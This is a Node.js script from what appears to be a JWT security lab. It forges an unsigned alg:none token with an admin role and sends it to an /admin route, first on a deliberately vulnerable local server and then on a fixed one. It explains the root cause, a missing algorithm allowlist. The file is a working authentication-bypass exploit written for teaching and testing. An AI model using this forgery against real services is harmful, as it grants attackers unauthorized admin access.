/*
 * ATTACK 01 — alg:none signature stripping
 * -----------------------------------------
 * Root cause: the server derives the verification algorithm from the token's
 * own (attacker-controlled) header and has no allowlist. Setting alg:"none"
 * tells the verifier "this token is unsigned", so it skips signature checks
 * and trusts whatever claims we put in the payload.
 *
 * Run:  node attacks/01-alg-none.js                # vs vulnerable (:4000)
 *       TARGET=http://localhost:5000 node attacks/01-alg-none.js   # vs secure
 */
const { b64urlJson, getAuth, banner, show, verdict, decodeJwt } = require('./_lib');

(async () => {
  banner('ATTACK 01 — alg:none (strip signature, forge admin)');

  // (a) A normal token would look like header.payload.signature. We fabricate
  //     an UNSIGNED one claiming to be admin.
  const header = { alg: 'none', typ: 'JWT' };
  const payload = { sub: 'attacker', role: 'admin' };
  // Signature segment is empty. Note the trailing dot.
  const forged = `${b64urlJson(header)}.${b64urlJson(payload)}.`;

  show('Forged token (alg:none, empty signature)', forged);
  show('Decoded header/payload', decodeJwt(forged));

  // (c)+(d) Send it to the admin-only route.
  const res = await getAuth('/admin', forged);
  show(`Server response  (HTTP ${res.status})`, res.body);

  const ok = res.status === 200 && res.body && res.body.secretFlag;
  verdict(ok, ok ? 'server accepted an unsigned token and returned admin data.'
               : 'server rejected the unsigned token.');
})();
